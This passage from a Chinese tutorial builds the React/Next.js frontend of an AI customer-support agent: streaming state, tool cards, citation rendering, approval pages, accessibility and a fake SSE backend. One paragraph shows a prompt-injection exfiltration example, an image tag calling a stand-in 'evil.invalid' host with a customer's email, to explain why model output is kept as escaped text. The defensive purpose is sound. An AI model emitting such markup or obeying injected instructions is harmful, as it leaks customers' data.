<line x1="100" y1="108" x2="158" y2="108"/><line x1="260" y1="100" x2="338" y2="40"/><line x1="260" y1="108" x2="338" y2="108"/><line x1="260" y1="116" x2="338" y2="176"/><line x1="260" y1="120" x2="440" y2="160"/>
<path d="M 490 38 C 560 38, 560 108, 492 108" stroke="var(--compute)" stroke-dasharray="4 3"/>
</g>
<g font-family="var(--font-mono)" font-size="10.5" fill="var(--ink-soft)">
<text x="129" y="100" text-anchor="middle">start</text>
<text x="290" y="58">done(waiting)</text>
<text x="286" y="102">done</text>
<text x="262" y="165">error / 异常</text>
<text x="400" y="150">abort</text>
<text x="566" y="76" fill="var(--compute)">客服审批后</text>
<text x="566" y="90" fill="var(--compute)">刷新进展</text>
</g>
</svg>
<figcaption>一次运行的状态。客户页面停在 waiting_approval 时,审批发生在客服的页面里;客户这边点"刷新进展",用 GET /tickets/{id} 拿到 done 的摘要,塞进同一个 reducer。</figcaption>
</figure>

reducer 里有两处是踩过坑才写成这样的。

**step 和 node 的顺序。** 后端的 `step` 事件是节点**执行中**推的(比如分诊结果、检索到哪几篇),`node` 事件是节点**跑完后**才推的。我最早的写法是两种事件各往步骤列表里插一行,结果页面上出现"✓ 分诊 · 分类:refund"紧跟着又一个"✓ 分诊"。现在 `steps` 只由 `node` 事件追加,`step` 带来的细节存进 `details`,按节点名挂上去。这种"同一件事从两个通道到达"的情况,在事件驱动的界面里很常见,先想清楚哪个事件是这件事的"权威来源"。

**质检退回时清空草稿。** draft 节点会重新生成,新的 token 从头推。不清空的话,第二版接在第一版后面,用户看到两段互相矛盾的文字。顺手记一个 `rewrites` 计数,界面上提示"质检退回 1 次,正在重写",用户就知道刚才那段话为什么消失了。

**`start` 先 abort 上一次。** 客户连点两次发送,或者上一次还没结束就发起新的追问,旧的流要先断掉,否则两个流的事件会交替进同一个 reducer。

**`apply` 用来塞一个不是从流里来的事件。** `GET /tickets/{id}` 返回的摘要和 `done` 事件的 data 是同一个形状(后端都是 `_summary()` 生成的),所以客户页面刷新进展时,直接当成一个 done 事件喂进去,不用再写一套更新逻辑。前后端共用一种数据形状,能省掉很多这样的胶水代码。

React 会把短时间内连续的状态更新合并成一次渲染,一个网络包里来十几个 token,通常只渲染一次,所以这里没有自己做节流。如果你的模型吐字特别快、回复特别长,页面开始掉帧,再考虑把 token 攒到 `requestAnimationFrame` 里批量提交。

## 组件:过程、工具卡片、回复和引用

```tsx
// supportpilot/web/src/components/RunView.tsx
"use client";
import { STEP_NAMES } from "@/lib/events";
import type { RunState } from "@/lib/useRun";
import { Reply } from "./Reply";
import { ToolCard } from "./ToolCard";

const STATUS_TEXT: Record<RunState["status"], string> = {
  idle: "",
  running: "处理中",
  waiting_approval: "已提交审批,等客服处理",
  done: "已完成",
  error: "出错了",
  stopped: "已停止接收",
};

export function RunView({ state, id, onStop }: { state: RunState; id: string; onStop?: () => void }) {
  if (state.status === "idle") return null;
  const running = state.status === "running";
  const final = state.summary?.reply;

  return (
    <section className="run" aria-busy={running} aria-labelledby={`${id}-status`}>
      <header className="run-head">
        {/* 只把状态变化读给屏幕阅读器听;逐字的 token 不播报,否则读屏会疯掉 */}
        <h3 id={`${id}-status`} aria-live="polite" className={`badge badge-${state.status}`}>
          {STATUS_TEXT[state.status]}
          {state.summary && ` · 花费 ¥${state.summary.cost_cny}`}
        </h3>
        {running && onStop && (
          <button type="button" className="btn-ghost" onClick={onStop}>
            停止
          </button>
        )}
      </header>

      <ol className="steps">
        {state.steps.map((node, i) => (
          <li key={i}>
            <span className="tick" aria-hidden="true">
              ✓
            </span>
            {STEP_NAMES[node] ?? node}
            {state.details[node] && <span className="step-detail"> · {state.details[node]}</span>}
          </li>
        ))}
        {running && <li className="pending">…</li>}
      </ol>

      {state.rewrites > 0 && <p className="note">质检退回 {state.rewrites} 次,正在重写回复</p>}

      {state.tools.length > 0 && <ul className="tools">{state.tools.map((t, i) => <ToolCard key={i} tool={t} />)}</ul>}

      {state.approval && (
        <p className="note note-approval">
          退款申请 {state.approval.request.id}(¥{state.approval.request.amount_cny})已提交
          {state.approval.needsFinanceReview && ",金额超过复核线,需要财务复核"}
        </p>
      )}

      {final ? (
        <Reply text={final} id={id} />
      ) : (
        state.draft && (
          <p className={`reply-body ${running ? "typing" : "draft"}`} aria-hidden={running}>
            {!running && <span className="muted">草稿,审批后定稿:</span>}
            {state.draft}
          </p>
        )
      )}

      {state.error && (
        <p className="error" role="alert">
          {state.error}
        </p>
      )}
    </section>
  );
}
```

`RunView` 分四块:顶部状态和花费、步骤列表、工具卡片、正文。正文有两种形态:跑的过程中显示打字机里的草稿;收到 `done` 之后,如果摘要里有 `reply`,换成后端定稿的回复(带引用)。停在审批时还没有定稿,继续显示草稿,并标明"草稿,审批后定稿",免得客户以为这就是最终答复。

```tsx
// supportpilot/web/src/components/ToolCard.tsx
import type { ToolEvent } from "@/lib/events";

// 写操作给客服看要醒目,和只读查询区分开
const WRITES = new Set(["create_refund_request", "escalate_to_human"]);

export function ToolCard({ tool }: { tool: ToolEvent }) {
  const write = WRITES.has(tool.name);
  return (
    <li className={`tool ${write ? "tool-write" : ""} ${tool.error ? "tool-error" : ""}`}>
      <div className="tool-head">
        <code>{tool.name}</code>
        <span className="tool-tag">{tool.error ? "出错" : write ? "写操作" : "查询"}</span>
      </div>
      <details>
        <summary>参数</summary>
        <pre>{JSON.stringify(tool.args, null, 2)}</pre>
      </details>
      {tool.error && <p className="tool-err">{tool.error}</p>}
    </li>
  );
}
```

工具卡片默认只显示工具名,参数折叠在 `<details>` 里。客服排查时点开看,客户不会被一屏 JSON 吓到。写操作(创建退款申请、转人工)用另一种底色,和只读查询一眼区分开。这个"写操作清单"在前端只是用来**显示**,真正的权限控制在后端 Day 46 的工具分级里,前端不能当安全边界。

回复里的引用要专门处理一下。Day 45 的 `render_sources()` 输出的是纯文本:正文里是 `[1]` `[2]`,末尾一段"参考文章:",每行一个标题加链接;审批通过后 finalize 节点还会在最后追加一句"补充:……"。前端把它拆成结构化数据:

```ts
// supportpilot/web/src/lib/reply.ts
// 后端 render_sources() 输出:正文里是 [1] [2],末尾一段「参考文章:」,每行 "[n] 标题 链接"。
// 这里拆成结构化数据,前端自己渲染,不把模型输出当 HTML/Markdown 塞进页面。

export type Source = { n: number; title: string; url: string };
export type ParsedReply = { body: string; sources: Source[] };

const FOOTER = "\n\n参考文章:\n";
const LINE = /^\[(\d+)\]\s+(.+?)\s+(https?:\/\/\S+)$/;

export function parseReply(reply: string): ParsedReply {
  const at = reply.indexOf(FOOTER);
  if (at < 0) return { body: reply, sources: [] };
  const sources: Source[] = [];
  const tail: string[] = [];
  for (const line of reply.slice(at + FOOTER.length).split("\n")) {
    const m = LINE.exec(line.trim());
    if (m) sources.push({ n: Number(m[1]), title: m[2], url: m[3] });
    else if (line.trim()) tail.push(line); // finalize 追加的「补充:…审核通过」在参考文章后面
  }
  const body = reply.slice(0, at) + (tail.length ? "\n\n" + tail.join("\n") : "");
  return { body, sources };
}

// 把正文切成文字段和引用标记,方便渲染成上标链接
export function splitCitations(body: string): (string | number)[] {
  return body.split(/\[(\d+)\]/).map((part, i) => (i % 2 === 1 ? Number(part) : part));
}
```

```tsx
// supportpilot/web/src/components/Reply.tsx
import { parseReply, splitCitations } from "@/lib/reply";

export function Reply({ text, id }: { text: string; id: string }) {
  const { body, sources } = parseReply(text);
  return (
    <div className="reply">
      <p className="reply-body">
        {splitCitations(body).map((part, i) =>
          typeof part === "number" ? (
            <sup key={i}>
              <a href={`#${id}-ref-${part}`} aria-label={`参考文章 ${part}`}>
                [{part}]
              </a>
            </sup>
          ) : (
            <span key={i}>{part}</span>
          ),
        )}
      </p>
      {sources.length > 0 && (
        <ol className="sources" aria-label="参考文章">
          {sources.map((s) => (
            <li key={s.n} id={`${id}-ref-${s.n}`} value={s.n}>
              <a href={s.url} target="_blank" rel="noopener noreferrer">
                {s.title}
              </a>
            </li>
          ))}
        </ol>
      )}
    </div>
  );
}
```

正文里的 `[1]` 渲染成上标链接,点了跳到下面的参考文章列表;参考文章渲染成真正的 `<a>`,`target="_blank"` 加 `rel="noopener noreferrer"`。

这里有一条原则:**模型的输出永远当纯文本处理。** 不用 `dangerouslySetInnerHTML`,也不引一个 Markdown 渲染库把它直接转成 HTML。模型可能被提示注入,吐出一个 `<img src="https://evil.invalid/?q=客户邮箱">`,浏览器一渲染就把数据发出去了。Day 53 会专门讲这种外泄方式,今天在界面层先把门关上:React 的文本节点天然会转义,我们只把自己解析出来、格式可控的链接渲染成 `<a>`。引用链接的格式是后端 `render_sources()` 生成的,不是模型直接写的,这也是为什么要后端来拼,不让模型自己写 URL。

## 两个页面

布局和样式:

```tsx
// supportpilot/web/src/app/layout.tsx
import type { Metadata } from "next";
import Link from "next/link";
import "./globals.css";

export const metadata: Metadata = { title: "SupportPilot", description: "CloudLedger 智能客服演示" };

export default function RootLayout({ children }: LayoutProps<"/">) {
  return (
    <html lang="zh-CN">
      <body>
        <nav className="topnav" aria-label="主导航">
          <strong>SupportPilot</strong>
          <Link href="/">客户视角</Link>
          <Link href="/desk">客服工作台</Link>
        </nav>
        <main>{children}</main>
      </body>
    </html>
  );
}
```

```css
/* supportpilot/web/src/app/globals.css  够用就行,不引 UI 库 */
:root { --ink:#1e2329; --soft:#474d57; --faint:#707a8a; --rule:#e6e8ea; --bg:#fafafa; --card:#fff;
  --accent:#9a6c00; --accent-bg:#fdf3d1; --tool:#03875a; --tool-bg:#dcf5ea; --danger:#c62828; color-scheme: light dark; }
@media (prefers-color-scheme: dark) { :root { --ink:#eaecef; --soft:#b7bdc6; --faint:#848e9c; --rule:#2b3139;
  --bg:#0b0e11; --card:#181a20; --accent:#f0b90b; --accent-bg:#2b2410; --tool:#0ecb81; --tool-bg:#0f2a20; --danger:#f6465d; } }
* { box-sizing: border-box; }
body { margin: 0; font: 16px/1.7 system-ui, "PingFang SC", sans-serif; color: var(--ink); background: var(--bg); }
.topnav { display: flex; gap: 1.2rem; align-items: center; padding: .8rem 1.5rem; border-bottom: 1px solid var(--rule); }
.topnav a { color: var(--soft); }
.page { max-width: 52rem; margin: 0 auto; padding: 1.5rem; }
label { display: grid; gap: .3rem; font-size: .9rem; color: var(--soft); }
input, select, textarea, button { font: inherit; }
input, select, textarea { padding: .5rem .6rem; border: 1px solid var(--rule); border-radius: 6px; background: var(--card); color: var(--ink); }
button { padding: .5rem 1rem; border-radius: 6px; border: 1px solid var(--accent); background: var(--accent); color: var(--bg); cursor: pointer; }
button:disabled { opacity: .45; cursor: not-allowed; }
button:focus-visible, a:focus-visible, input:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
.btn-ghost, .link { background: transparent; color: var(--accent); }
.link { border: 0; padding: 0; text-decoration: underline; }
.btn-danger { background: transparent; color: var(--danger); border-color: var(--danger); }
.ticket-form, .decide { display: grid; gap: .8rem; }
.decide { grid-template-columns: 1fr auto auto; align-items: end; }
.ask { display: flex; gap: .5rem; margin-top: 1rem; } .ask input { flex: 1; }
.muted { color: var(--faint); font-size: .9rem; } .empty { color: var(--soft); padding: 2rem 0; }
.error { color: var(--danger); } .warn { color: var(--danger); font-weight: 600; }
.card, .run { background: var(--card); border: 1px solid var(--rule); border-radius: 10px; padding: 1rem 1.2rem; margin: 1rem 0; }
.run-head { display: flex; justify-content: space-between; align-items: center; }
.badge { margin: 0; font-size: .95rem; } .badge-waiting_approval { color: var(--accent); } .badge-error { color: var(--danger); }
.steps { list-style: none; padding: 0; margin: .6rem 0; display: flex; flex-wrap: wrap; gap: .3rem .9rem; font-size: .9rem; }
.tick { color: var(--tool); margin-right: .2rem; } .step-detail { color: var(--faint); } .pending { color: var(--faint); }
.tools { list-style: none; padding: 0; display: grid; gap: .5rem; }
.tool { border: 1px solid var(--rule); border-left: 3px solid var(--tool); border-radius: 6px; padding: .4rem .7rem; font-size: .88rem; }
.tool-write { border-left-color: var(--accent); background: var(--accent-bg); } .tool-error { border-left-color: var(--danger); }
.tool-head { display: flex; justify-content: space-between; } .tool-tag { color: var(--faint); font-size: .8rem; }
.tool pre { margin: .3rem 0 0; font-size: .8rem; overflow-x: auto; } .tool-err { color: var(--danger); margin: .3rem 0 0; }
.note { font-size: .9rem; color: var(--soft); } .note-approval { color: var(--accent); }
.reply-body { white-space: pre-wrap; } .sources { font-size: .88rem; color: var(--soft); }
.typing::after { content: "▌"; animation: blink 1s steps(2) infinite; }
@keyframes blink { 50% { opacity: 0; } }
@media (prefers-reduced-motion: reduce) { .typing::after { animation: none; } }
.bubble { margin-left: auto; max-width: 80%; background: var(--accent-bg); padding: .5rem .8rem; border-radius: 10px; width: fit-content; }
.sr-only { position: absolute; width: 1px; height: 1px; overflow: hidden; clip-path: inset(50%); }
.amount { color: var(--accent); }
@media (max-width: 560px) { .decide { grid-template-columns: 1fr; } }
```

样式没引 UI 库,四十来行 CSS,跟随系统切换明暗。演示项目的重点是交互和数据,花两天调组件库主题不值得。如果你平时用 shadcn/ui 或者 Tailwind,换上去也就半小时。

客户视角:

```tsx
// supportpilot/web/src/app/page.tsx  客户视角:提交工单、看过程、追问
"use client";
import { useState } from "react";
import { RunView } from "@/components/RunView";
import { createTicket, followUp, getTicket, runTicket } from "@/lib/api";
import { ApiError } from "@/lib/sse";
import { useRun } from "@/lib/useRun";

const DEMO_EMAILS = ["lina@example.com", "wangfang@example.com", "liuyang@example.com", "chenjing@example.com",
  "yanglei@example.com", "wugang@example.com", "nobody@example.com"];

type Turn = { role: "customer"; text: string } | { role: "agent"; key: string };

export default function CustomerPage() {
  const [ticketId, setTicketId] = useState<string | null>(null);
  const [turns, setTurns] = useState<Turn[]>([]);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [msg, setMsg] = useState("");
  const { state, start, stop, apply } = useRun();
  // 历史轮次只保留最终结果,当前这一轮用 useRun 的实时状态渲染
  const [history, setHistory] = useState<Record<string, typeof state>>({});
  const busy = state.status === "running";

  function archiveCurrent() {
    if (state.status === "idle") return;
    const key = `t${turns.length}`;
    setHistory((h) => ({ ...h, [key]: state }));
    setTurns((t) => [...t, { role: "agent", key }]);
  }

  async function submit(form: FormData) {
    setSubmitError(null);
    try {
      const { ticket_id } = await createTicket({
        customer_email: String(form.get("email")),
        subject: String(form.get("subject")),
        body: String(form.get("body")),
      });
      setTicketId(ticket_id);
      setTurns([]);
      setHistory({});
      start((signal) => runTicket(ticket_id, signal));
    } catch (e) {
      setSubmitError(e instanceof ApiError ? e.message : "提交失败,请检查后端是否启动");
    }
  }

  function ask(e: React.FormEvent) {
    e.preventDefault();
    if (!ticketId || !msg.trim()) return;
    archiveCurrent();
    setTurns((t) => [...t, { role: "customer", text: msg }]);
    const content = msg;
    setMsg("");
    start((signal) => followUp(ticketId, content, signal));
  }

  return (
    <div className="page">
      <h1>提交工单</h1>
      {!ticketId && (
        <form action={submit} className="ticket-form">
          <label>
            发件邮箱(演示数据)
            <select name="email" defaultValue={DEMO_EMAILS[0]}>
              {DEMO_EMAILS.map((m) => (
                <option key={m}>{m}</option>
              ))}
            </select>
          </label>
          <label>
            主题
            <input name="subject" defaultValue="想退款" maxLength={200} required />
          </label>
          <label>
            问题描述
            <textarea name="body" rows={4} maxLength={4000} required
              defaultValue="上周买的专业版年付,发现用不上,能退吗?请帮我退款。" />
          </label>
          <button type="submit">提交工单</button>
          {submitError && <p className="error" role="alert">{submitError}</p>}
        </form>
      )}

      {ticketId && (
        <>
          <p className="muted">
            工单号 {ticketId} ·{" "}
            <button type="button" className="link" onClick={() => { setTicketId(null); setTurns([]); }} disabled={busy}>
              新建工单
            </button>
          </p>
          {turns.map((t, i) =>
            t.role === "customer" ? (
              <p key={i} className="bubble">{t.text}</p>
            ) : (
              <RunView key={i} state={history[t.key]} id={t.key} />
            ),
          )}
          <RunView state={state} id="current" onStop={stop} />
          <form onSubmit={ask} className="ask">
            <label htmlFor="ask" className="sr-only">继续追问</label>
            <input id="ask" value={msg} onChange={(e) => setMsg(e.target.value)} placeholder={`在工单 ${ticketId} 里继续追问`}
              disabled={busy || state.status === "waiting_approval"} />
            <button type="submit" disabled={busy || !msg.trim() || state.status === "waiting_approval"}>发送</button>
          </form>
          {state.status === "waiting_approval" && (
            <p className="muted">
              退款在等客服审批,审批完成后可以继续追问。{" "}
              <button type="button" className="link"
                onClick={async () => apply({ event: "done", data: await getTicket(ticketId) })}>
                刷新进展
              </button>
            </p>
          )}
        </>
      )}
    </div>
  );
}
```

几个交互上的决定:

- 提交表单用的是 React 19 的 form action(`<form action={submit}>`),不用自己 `preventDefault`。
- 历史轮次只保存最终状态,当前这一轮用 `useRun` 的实时状态渲染。追问时先把当前这一轮存进 `history`,再开始新的一轮。
- 停在审批时,输入框禁用,下面一行说明原因,并给一个"刷新进展"。不禁用的话客户发了追问,后端返回 409,虽然我们也会显示 409 里的中文提示,但能在前面挡住的就别让用户撞上去。
- 刷新进展是手动的。做成每 5 秒轮询一次也可以,演示项目手动更直观;生产环境更好的做法是客户页面也订阅一个事件通道,审批完成时后端主动推。

客服工作台:

```tsx
// supportpilot/web/src/app/desk/page.tsx  客服工作台:待审批列表,一键通过/驳回
"use client";
import { useCallback, useEffect, useState } from "react";
import { RunView } from "@/components/RunView";
import { decide, listApprovals, type PendingRefund } from "@/lib/api";
import { useRun } from "@/lib/useRun";

const FINANCE_REVIEW_LINE = 1000; // 和后端 settings.refund_review_threshold 保持一致,只用于提示,真正的判断在后端

function ApprovalCard({ r }: { r: PendingRefund }) {
  const [note, setNote] = useState("");
  const { state, start } = useRun();
  const decided = state.status !== "idle";

  function go(approved: boolean) {
    start((signal) => decide(r.ticket_id, { approved, approver: "demo-finance", note }, signal));
  }

  return (
    <article className="card" aria-labelledby={`h-${r.id}`}>
      <h2 id={`h-${r.id}`}>
        {r.id} · {r.customer_name} · <span className="amount">¥{r.amount_cny}</span>
      </h2>
      <p className="muted">
        工单 {r.ticket_id}:{r.subject ?? ""} · 规则 <code>{r.rule}</code> · 原因:{r.reason}
      </p>
      {r.amount_cny > FINANCE_REVIEW_LINE && <p className="warn">金额超过 {FINANCE_REVIEW_LINE} 元,按政策需要财务复核</p>}
      {!decided && (
        <div className="decide">
          <label>
            审批备注
            <input value={note} onChange={(e) => setNote(e.target.value)} placeholder="驳回时建议写原因,会发给客户" />
          </label>
          <button type="button" onClick={() => go(true)}>通过</button>
          <button type="button" className="btn-danger" onClick={() => go(false)}>驳回</button>
        </div>
      )}
      <RunView state={state} id={`run-${r.id}`} />
    </article>
  );
}

export default function DeskPage() {
  const [items, setItems] = useState<PendingRefund[] | null>(null);
  const [error, setError] = useState<string | null>(null);

  const load = useCallback(() => {
    listApprovals().then(setItems, () => setError("拉取待审批列表失败,请检查后端是否启动"));
  }, []);
  useEffect(load, [load]);

  return (
    <div className="page">
      <h1>
        待审批退款{" "}
        <button type="button" className="link" onClick={load}>刷新</button>
      </h1>
      {error && <p className="error" role="alert">{error}</p>}
      {items === null && !error && <p className="muted">加载中…</p>}
      {items?.length === 0 && <p className="empty">没有待审批的退款。去客户视角提交一张退款工单试试。</p>}
      {/* 审批完不立刻从列表移除:客服要看到恢复后的流程跑完,下次刷新再消失 */}
      {items?.map((r) => <ApprovalCard key={r.id} r={r} />)}
    </div>
  );
}
```

每张审批卡片自己持有一个 `useRun`,点"通过"或"驳回"后,恢复的流程就在这张卡片里跑完,客服能看到定稿的回复和最终花费。审批后卡片不立刻从列表里消失,等客服点刷新才消失;一点就消失的话,客服没法确认自己刚才批的是哪一笔。

复核线 1,000 元在前端写死了一份,只用来显示提示。后端 interrupt 事件里其实带了 `needs_finance_review`,但 `/approvals` 列表接口没返回这个字段。更干净的做法是让列表接口也返回它,前端就不用和后端各存一份阈值。这个留作练习。

<figure class="video">
<div class="video-frame"><iframe src="https://player.bilibili.com/player.html?bvid=BV1ymMyzqEEh&autoplay=0&high_quality=1" title="Vercel AI SDK零基础教程，React/Vue轻松集成AI大语言模型对话聊天功能Chatbot" loading="lazy" scrolling="no" allowfullscreen></iframe></div>
<figcaption>码里奥Ziho · Vercel AI SDK 零基础教程(6 集,2025 年)· 看前两集了解 useChat 的写法,和我们手写的 reducer 对比:它帮你省了什么,又要求后端说什么协议。视频里的版本比现在旧,API 以官方文档为准。</figcaption>
</figure>

## 停止和断线

"停止"按钮调的是 `AbortController.abort()`。浏览器这边很直接:`fetch` 的读取抛出 AbortError,reducer 进入 `stopped`,界面显示"已停止接收"。

后端那边会发生什么,要想清楚。sse-starlette 会检测到客户端断开,不再从我们的生成器里取下一个事件。我们的生成器是放在线程池里一步一步取的,每取一步可能要执行完一整个节点(比如 act 节点里的几次工具调用),所以**正在执行的那一步会跑完,之后的步骤不会再执行**,LangGraph 的状态停在最后一个完成的节点。这是我根据 sse-starlette 和 `iterate_in_threadpool` 的工作方式推出来的,你可以自己验证:用 `curl -N` 跑一张工单,看到第一个 tool 事件就按 Ctrl-C,再 `GET /tickets/{id}`,看 `waiting_on` 停在哪个节点。

这带来一个产品问题:停止之后,工单是一个跑了一半的状态。如果停在 act 之后,退款申请可能已经建好了。所以"停止"对客户来说更准确的含义是"我不想看了",而不是"撤销"。真正的撤销要在后端设计(比如退款申请在审批前可以作废),不能靠前端断开连接实现。

断线是另一回事:网络抖了一下,不是用户主动停的。`EventSource` 会自动重连,我们用 fetch 就得自己来。演示版只显示"连接中断,请稍后重试";生产环境的做法是断线后先 `GET /tickets/{id}` 看工单走到哪了,已经结束就直接显示结果,没结束就提示用户刷新。真正的断点续传(带着 `Last-Event-ID` 重连,从断开的那条事件接着推)需要后端把事件存下来,思路和 Day 37 的断点续跑类似,这里不展开。

## 可访问性

流式界面对读屏软件很不友好,最常见的错误是把逐字输出的区域设成 `aria-live`:读屏软件会试图播报每一次变化,一句话被拆成几十次播报,用户根本听不下去。

我们的处理:

- 只有顶部的状态行是 `aria-live="polite"`,播报"处理中""已提交审批,等客服处理""已完成 · 花费 ¥0.0123"这几次变化。
- 打字机区域在流式过程中 `aria-hidden`,跑完之后定稿回复正常可读。
- 运行区域在流式过程中标 `aria-busy`,告诉辅助技术内容还在变。
- 错误用 `role="alert"`,会被立即播报。
- 所有按钮和输入框都有可见的焦点样式;追问输入框有一个视觉上隐藏、读屏能读到的 `<label>`。
- 打字机光标的闪烁动画在系统开了"减少动画"时关掉。

这些加起来不到二十行,但面试时被问到"你的界面考虑过无障碍吗",能说出"逐字输出不该放进 live region"这种具体的点,比泛泛说"考虑过"有分量得多。

## 不花钱调界面:假后端

调界面要反复跑同一个流程几十次。每次都真调模型,既慢又花钱,而且模型每次输出不一样,不好对比。我写了一个假后端:路径、事件名、数据形状都和真后端一样,内容写死,还专门放了一次"质检退回"和一笔待审批的退款,把界面上该出现的状态都覆盖到。只用 Python 标准库,不用装任何东西:

```python
# supportpilot/web/scripts/fake_api.py
"""假后端:和 Day 49 api/app.py 同样的路径和 SSE 事件,用来在没有模型和数据库时测前端。"""
import json, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

STATE = {"T1": "new"}
REPLY_DRAFT = "您好,查到您 9 月 12 日的年付订单被扣了两次 [1],多扣的 39 元已提交退款申请 [2]。"
FINAL = (REPLY_DRAFT + "\n\n参考文章:\n[1] 重复扣款怎么办 https://help.cloudledger.example/kb/refund-003\n"
         "[2] 退款政策 https://help.cloudledger.example/kb/refund-002\n\n补充:您的退款申请已审核通过,39 元将原路退回。")


class H(BaseHTTPRequestHandler):
    def cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "content-type, accept")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")

    def do_OPTIONS(self):
        self.send_response(204); self.cors(); self.end_headers()

    def j(self, code, obj):
        b = json.dumps(obj, ensure_ascii=False).encode()
        self.send_response(code); self.cors(); self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(b))); self.end_headers(); self.wfile.write(b)

    def sse(self, events):
        self.send_response(200); self.cors(); self.send_header("content-type", "text/event-stream")
        self.send_header("cache-control", "no-cache"); self.end_headers()
        try:
            self.wfile.write(b": ping\n\n"); self.wfile.flush()
            for ev, data, delay in events:
                time.sleep(delay)
                self.wfile.write(f"event: {ev}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n".encode()); self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError):
            print("client disconnected", flush=True)

    def summary(self, outcome, reply):
        return {"ticket_id": "T1", "outcome": outcome, "category": "refund", "reply": reply, "tool_log": [],
                "cost_cny": 0.0123, "waiting_on": ["approval"] if outcome == "waiting_approval" else []}

    def do_GET(self):
        if self.path == "/approvals":
            items = [] if STATE["T1"] != "waiting" else [{"id": "RR-0007", "ticket_id": "T1", "customer_name": "刘洋",
                     "amount_cny": 39.0, "rule": "duplicate_charge", "reason": "同日重复扣款", "subject": "扣了两次",
                     "created_at": "2026-10-12 10:00"}]
            return self.j(200, items)
        if self.path == "/tickets/T1":
            return self.j(200, self.summary("resolved", FINAL) if STATE["T1"] == "resolved" else self.summary("waiting_approval", None))
        self.j(404, {"detail": "not found"})

    def do_POST(self):
        n = int(self.headers.get("content-length") or 0); body = json.loads(self.rfile.read(n) or b"{}")
        if self.path == "/tickets":
            return self.j(200, {"ticket_id": "T1"})
        if self.path == "/tickets/T1/run":
            STATE["T1"] = "waiting"
            ev = [("node", {"node": "load_customer"}, .3),
                  ("step", {"type": "step", "node": "classify", "category": "refund"}, .3), ("node", {"node": "classify"}, .1),
                  ("step", {"type": "step", "node": "retrieve", "docs": ["KB-refund-002", "KB-refund-003"]}, .3), ("node", {"node": "retrieve"}, .1),
                  ("tool", {"type": "tool", "name": "list_invoices", "args": {"months": 2}, "error": None}, .3),
                  ("tool", {"type": "tool", "name": "create_refund_request", "args": {"invoice_id": "INV-2291", "amount_cny": 39}, "error": None}, .3),
                  ("node", {"node": "act"}, .1)]
            ev += [("token", {"type": "token", "text": "这是第一版草稿。"}, .05)]
            ev += [("step", {"type": "step", "node": "check", "passed": False, "problems": ["引用编号不存在"]}, .3)]
            ev += [("token", {"type": "token", "text": ch}, .03) for ch in REPLY_DRAFT]
            ev += [("step", {"type": "step", "node": "check", "passed": True, "problems": []}, .2), ("node", {"node": "check"}, .05),
                   ("interrupt", {"type": "refund_approval", "ticket_id": "T1",
                                  "request": {"id": "RR-0007", "amount_cny": 39.0, "rule": "duplicate_charge"},
                                  "needs_finance_review": False}, .1),
                   ("done", self.summary("waiting_approval", None), .05)]
            return self.sse(ev)
        if self.path == "/approvals/T1":
            if STATE["T1"] != "waiting":
                return self.j(409, {"detail": "这个工单不在等待审批"})
            STATE["T1"] = "resolved"
            return self.sse([("node", {"node": "approval"}, .3), ("node", {"node": "finalize"}, .3),
                             ("done", self.summary("resolved", FINAL), .1)])
        if self.path == "/tickets/T1/messages":
            if STATE["T1"] == "waiting":
                return self.j(409, {"detail": "工单还在等待审批,审批完成后才能继续对话"})
            return self.sse([("node", {"node": "draft"}, .2)] + [("token", {"type": "token", "text": c}, .05) for c in "一般 3 到 5 个工作日到账。" * 6]
                            + [("done", self.summary("resolved", "一般 3 到 5 个工作日到账。"), .1)])
        self.j(404, {"detail": "not found"})

    def log_message(self, *a):
        pass


ThreadingHTTPServer(("127.0.0.1", 8077), H).serve_forever()
```

```bash
python3 web/scripts/fake_api.py &                      # 8077 端口
cd web
NEXT_PUBLIC_SUPPORTPILOT_API=http://127.0.0.1:8077 npm run dev
```

我用它在浏览器里把整套交互跑了一遍(Playwright 自动点的),结果是这样:

| 检查 | 结果 |
| --- | --- |
| 跑到一半时状态行 | 处理中,"质检退回 1 次"提示出现,打字机里是第二版草稿 |
| 停在审批时 | 状态"已提交审批,等客服处理";2 张工具卡片,其中 1 张标为写操作;追问框禁用 |
| 工作台点"通过" | 卡片里跑完 approval → finalize,显示定稿回复、2 个上标引用、2 条参考文章 |
| 客户页点"刷新进展" | 状态变"已完成",追问框可用 |
| 追问中点"停止" | 状态"已停止接收",假后端日志打印 client disconnected |
| 审批后刷新工作台 | 显示"没有待审批的退款"的空状态 |

步骤重复显示的那个 bug,就是在这一步截图时发现的。界面上的问题,看截图比读代码快得多。

## 给谁看什么:三种用户,三种信息密度

同一张工单,客户、客服、财务想看到的东西完全不一样,界面设计的核心就是这个。

客户只关心结果和进度。工具调用的参数、检索到的文章编号、质检意见,对客户来说都是噪音,甚至会引起不必要的担心("它为什么在查我的账单?")。生产环境给客户的界面,过程信息应该收敛成几个友好的阶段提示,比如"正在查询您的账户""正在为您整理答复",最终回复里的引用渲染成可点击的帮助文章链接。我们的演示界面把全部过程都摊开了,是为了让面试官看到 Agent 在干什么,真实产品里要收起来。

客服需要看全过程。转人工的工单到了客服手里,他第一件事是搞清楚 Agent 已经做了什么、查到了什么、为什么没处理好。`GET /tickets/{id}` 返回的 `tool_log` 就是给这个场景准备的。一个好的客服工作台会把 Agent 的调查结论、检索到的资料、草稿和质检意见并排展示,客服在草稿基础上改两句就能发,而不是从头再查一遍。

财务只需要做决定所需的最少信息:多少钱、哪个客户、依据哪条规则、有没有异常(比如金额超过复核线)。信息太多反而会让审批变慢。我们的审批卡片只放了这几样。

还有一个容易被忽略的指标:首字延迟。一张工单完整处理要十几秒,但如果第一个字在三四秒内出现,用户的感受会好很多。我们的设计里,分诊、检索、调工具这几步都在起草之前,所以首字要等这些全部完成。能优化的地方有两个:一是把阶段提示尽早推出去(我们已经做了),二是 Day 52 用小模型做分诊、压缩各步的耗时。PRD 里定的"首个 token ≤ 8 秒",到时候用真实数据验收。

